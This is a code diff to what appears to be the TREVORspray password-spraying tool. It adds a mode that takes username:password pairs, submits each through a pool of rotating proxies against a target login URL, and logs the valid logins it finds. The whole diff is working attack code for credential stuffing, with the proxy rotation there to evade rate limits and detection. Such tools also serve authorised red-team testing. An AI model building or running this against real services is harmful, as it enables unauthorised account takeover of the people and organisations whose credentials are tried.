@@ -113,6 +113,18 @@ class TrevorSpray:
                 discovery = self.discovery(self.options.recon)
                 discovery.recon()
 
+            if self.options.userpass:
+                # username + password pair
+                log.info(
+                    f"Spraying {len(self.options.userpass):,} users against {self.sprayer.url} at {time.ctime()}"
+                )
+                self.spray(user_pass=True)
+                log.info(
+                    f"Finished spraying {self.sprayed_counter:,} users against {self.sprayer.url} at {time.ctime()}"
+                )
+                for success in self.valid_logins:
+                    log.success(success)
+
             if self.options.users:
                 # user enumeration
                 if self.options.recon:
@@ -139,7 +151,7 @@ class TrevorSpray:
         finally:
             self.stop()
 
-    def spray(self, enumerate_users=False):
+    def spray(self, enumerate_users=False, user_pass=False):
         if enumerate_users:
             sprayer = self.user_enumerator
         else:
@@ -161,12 +173,25 @@ class TrevorSpray:
             log.error(f"Failed to initialize {sprayer.__class__.__name__}")
             return
 
-        for password in [None] if enumerate_users else self.options.passwords:
-            for user in self.options.users:
+        if not user_pass:
+            for password in [None] if enumerate_users else self.options.passwords:
+                for user in self.options.users:
+                    accepted = False
+                    while not accepted and not self._stop:
+                        for proxy in self.proxies:
+                            accepted = proxy.submit(user, password, enumerate_users)
+                            if accepted:
+                                break
+
+                        if not accepted:
+                            time.sleep(0.1)
+        elif user_pass:
+            for line in self.options.userpass:
+                username, password = line.split(":", 1)
                 accepted = False
                 while not accepted and not self._stop:
                     for proxy in self.proxies:
-                        accepted = proxy.submit(user, password, enumerate_users)
+                        accepted = proxy.submit(username, password, enumerate_users)
                         if accepted:
                             break
 
